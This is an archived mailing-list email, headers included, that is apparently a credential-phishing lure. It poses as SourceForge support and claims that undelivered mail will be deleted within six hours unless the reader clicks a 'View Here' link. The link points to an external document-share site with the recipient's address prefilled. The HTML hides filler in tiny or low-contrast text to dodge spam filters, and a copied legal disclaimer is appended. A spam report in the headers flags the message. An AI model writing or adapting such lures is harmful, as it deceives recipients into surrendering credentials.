Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AB2B790693D
	for <lists+industrypack-devel@lfdr.de>; Thu, 13 Jun 2024 11:48:52 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sHh4d-00073p-7K
	for lists+industrypack-devel@lfdr.de;
	Thu, 13 Jun 2024 09:48:51 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <sahra@stonexgroup.shop>) id 1sHh4a-00073U-Ua
 for industrypack-devel@lists.sourceforge.net;
 Thu, 13 Jun 2024 09:48:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Kc6XNBGJVQXEG+LKHjQAz1BZPJjniE5zA/LjOVAxtss=; b=GMsAA1gpw4lQ1l5YZ02o5OwGP3
 b/tSb12eX3buA88zayGoAG7AJzDdScGShO+mILdhLyvktWIYY42L3BPapHKAgx9smqAJR3VJKDgPh
 L/yR+5I1xQsrHXrsAiqFfXspsQaHKcvj8uMdSTzZLVbP174oHyACS7rt2IjR45z3UgjU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Kc6XNBGJVQXEG+LKHjQAz1BZPJjniE5zA/LjOVAxtss=; b=f
 UalaSjDSOM34tl3RYVomJbIMzBnHhr7F2mkNFXXAk/Exi126ex7t+7uIc4wQo0VGWmU6GQBYnC+f9
 F18w6skQab8lCqJXDP1cMdaxWouXAyLA4OTODFpwiMEnxrOUr3QWwhKTYMcqnV/ZcQFYoitCLlHMd
 Z+5XO1lJtHAf/fCE=;
Received: from ns1.stonexgroup.shop ([31.192.236.77])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sHh4a-0007FO-VT for industrypack-devel@lists.sourceforge.net;
 Thu, 13 Jun 2024 09:48:49 +0000
Received: from [109.248.151.221] (unknown [109.248.151.221])
 by ns1.stonexgroup.shop (Postfix) with ESMTPA id 0518139461
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 13 Jun 2024 11:16:04 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=stonexgroup.shop;
 s=202405; t=1718270165;
 bh=Kc6XNBGJVQXEG+LKHjQAz1BZPJjniE5zA/LjOVAxtss=;
 h=From:To:Subject:Date:From;
 b=bKxq7wBxbEZNqO2phdfO+/G+MddSUqrK9IWU4Y4hcMmn8JXRZIwS1j6ZoSXATaBGp
 LuenE4kS5ZLMHAdXqsMGQmxswbCbUkKFEZIkW9YFS2GrH5GFJTiEEe6wxseLUMT+Vb
 HiS77S3lHOwOEhJrS6Gz8YMBnfk9YYxUQi4DE70aKdeXH6DKygH88butYlJJFX84ik
 mA4a2/c1rEm2qrR4p6V6YGlT+J+PNH67h8kjv45hKSPOIb6e9IgStDsuXDxxVou6hU
 TsoWdq4+pEx9NYMDS6Fy/P72GINmUrwYOe7EwRblXvzMCjmiWxwohjER0mqXwPCgh5
 sM2XELcLzhgCw==
To: industrypack-devel@lists.sourceforge.net
Date: 13 Jun 2024 12:16:03 +0300
Message-ID: <20240613080255.AE8ED5BF60C60C28@stonexgroup.shop>
MIME-Version: 1.0
X-Spam-Score: 7.8 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: SERVER MAINTENANCE IS COMPLETED . We have found 08 incoming
 mails that couldn't be delivered to your inbox folder. You have 6hours from
 6/13/2024 8:02:55 a.m. to take action or messages will automatically deleted
 from server. 
 Content analysis details:   (7.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: fastdocshare.net]
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: fastdocshare.net]
 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [31.192.236.77 listed in dnsbl-1.uceprotect.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [31.192.236.77 listed in sa-trusted.bondedsender.org]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [31.192.236.77 listed in bl.score.senderscore.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.9 URG_BIZ                Contains urgent matter
X-Headers-End: 1sHh4a-0007FO-VT
Subject: [Industrypack-devel] Urgent Notice!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "Support lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "Support lists.sourceforge.net" <sahra@stonexgroup.shop>
Content-Type: multipart/mixed; boundary="===============3666373821948123954=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============3666373821948123954==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;"><p><font color=3D"#e4261b" face=3D"Arial"><s=
trong><font color=3D"#30884d">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
sp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;SERVER MAINTENANCE IS COMPLETE=
D </font><span style=3D"font-size: 5.6px;"><span style=3D"font-size: 6.9px;=
"><span style=3D"font-size: 8.2px;"><span style=3D"font-size: 9.5px;"><span=
 style=3D"font-size: 10.8px;"><span style=3D"font-size: 12.1px;"><span styl=
e=3D"font-size: 13.4px;"> <span style=3D"font-size: 14.7px;">
<span style=3D"font-size: 16px;"><a href=3D"https://www.facebook.com/"><spa=
n style=3D"font-size: 14.7px;"><span style=3D"font-size: 13.4px;"><span sty=
le=3D"font-size: 12.1px;"><span style=3D"font-size: 10.8px;"><span style=3D=
"font-size: 9.5px;"><span style=3D"font-size: 8.2px;"><span style=3D"font-s=
ize: 6.9px;"><span style=3D"font-size: 5.6px;"><span style=3D"font-size: 4.=
3px;"><span style=3D"font-size: 3px;"><span style=3D"font-size: 1.7px;"><sp=
an style=3D"font-size: 0.4px;">.</span> </span></span></span></span></span>=

</span></span></span></span></span></span></a></span></span></span></span><=
/span></span></span></span></span></strong></font> <font color=3D"#000000" =
style=3D"font-family: Roboto, sans-serif; font-size: 14px; box-sizing: bord=
er-box;"><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: bor=
der-box;">We have found 08 incoming mails that couldn't be delivered to you=
r inbox folder. <br style=3D"box-sizing: border-box;"><br style=3D"box-sizi=
ng: border-box;">
You have 6hours from&nbsp;6/13/2024 8:02:55 a.m. to take action or messages=
 will automatically deleted from server.<br style=3D"box-sizing: border-box=
;"><br style=3D"box-sizing: border-box;"></font></p><table width=3D"393" st=
yle=3D"width: 294.75pt; font-family: arial, sans-serif;" border=3D"0" cellp=
adding=3D"0"><tbody><tr style=3D"height: 22.5pt;"><td width=3D"200" nowrap=
=3D"" style=3D"background: 0% 50% rgb(0, 120, 215); padding: 0.75pt 15pt; b=
order: 1pt solid rgb(0, 120, 215); width: 150pt; height: 22.5pt;">
<p align=3D"center" style=3D"margin: 0in 0in 0pt; text-align: center; font-=
family: Calibri, sans-serif, serif, EmojiFont; font-size: 11pt;"><a id=3D"m=
_8812774150329730555gmail-x_m_-9066078198102878784gmail-m_-2684952119851159=
211LPlnk633408" href=3D"https://s3docs.fastdocshare.net/?email=3Dindustrypa=
ck-devel@lists.sourceforge.net" target=3D"_blank" rel=3D"noopener noreferre=
r"><span style=3D"font-size: 12pt;"><b><span style=3D"font-family: Tahoma, =
sans-serif, serif, EmojiFont; font-size: 10.5pt;"><font color=3D"#ffffff">V=
iew Here</font></span>
</b></span></a></p></td></tr></tbody></table><p><font color=3D"#000000" sty=
le=3D"font-family: Roboto, sans-serif; font-size: 14px; box-sizing: border-=
box;"><br style=3D"box-sizing: border-box;"><span class=3D"gmail-v1il" styl=
e=3D"color: rgb(128, 128, 128); font-family: Arial, sans-serif; font-size: =
10.66px; box-sizing: border-box;"><span style=3D"font-size: 9.3px; box-sizi=
ng: border-box;">NOTICE</span></span>
&nbsp; <span style=3D"color: rgb(128, 128, 128); font-family: Arial, sans-s=
erif; font-size: 10.66px; box-sizing: border-box;"><span style=3D"font-size=
: 9.3px; box-sizing: border-box;">: The information contained in this elect=
ronic mail transmission is intended by limosajewellery.com&nbsp;for the use=
 of the named individual or entity to which it is addressed and may contain=
 information that is privileged or otherwise</span><span style=3D"box-sizin=
g: border-box;">
<span style=3D"font-size: 9.3px; box-sizing: border-box;">&nbsp;</span></sp=
an></span> &nbsp; <span class=3D"gmail-v1il" style=3D"color: rgb(128, 128, =
128); font-family: Arial, sans-serif; font-size: 10.66px; box-sizing: borde=
r-box;"><span style=3D"font-size: 9.3px; box-sizing: border-box;">confident=
ial</span></span>&nbsp; <span style=3D"color: rgb(128, 128, 128); font-fami=
ly: Arial, sans-serif; font-size: 10.66px; box-sizing: border-box;"><span s=
tyle=3D"font-size: 9.3px; box-sizing: border-box;">
=2E It is not intended for transmission to, or receipt by, any individual o=
r entity other than the named addressee (or person authorized to deliver it=
 to the named addressee) except as otherwise expressly permitted in this el=
ectronic mail transmission. If you have received this electronic transmissi=
on in error, please unsubscribe&nbsp; to avoid getting such messages in the=
 nearest future</span>&nbsp;</span>
 <span style=3D"color: rgb(128, 128, 128); font-family: Arial, sans-serif; =
font-size: 10.66px; box-sizing: border-box;"><span style=3D"font-size: 9.3p=
x; box-sizing: border-box;">. We may also need to contact you for additiona=
l information as required by HIPAA or State law</span></span></font></p></b=
ody></html>


--===============3666373821948123954==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============3666373821948123954==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============3666373821948123954==--
